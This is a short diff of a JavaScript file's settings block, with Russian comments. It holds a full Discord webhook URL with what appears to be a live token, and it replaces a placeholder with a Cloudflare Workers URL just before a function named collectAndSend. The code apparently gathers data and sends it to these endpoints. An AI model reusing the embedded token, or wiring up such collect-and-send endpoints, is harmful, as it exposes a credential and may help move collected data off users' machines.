@@ -2,7 +2,7 @@
 // НАСТРОЙКИ
 // ==================================================
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1568934373611413606/CrpWp7F7muDIhsSkcxFJ2qWD8dclJ-MfuN2oj626Iz49oBTZUP8Tn2MD0eJb0UQQOwRb";
-const WORKER_URL  = "https://ВСТАВЬ_СЮДА_СВОЙ_ВОРКЕР.workers.dev";
+const WORKER_URL  = "https://wispy-bar-366f.afdsafdsaf32.workers.dev";
 // ==================================================
 
 async function collectAndSend() {
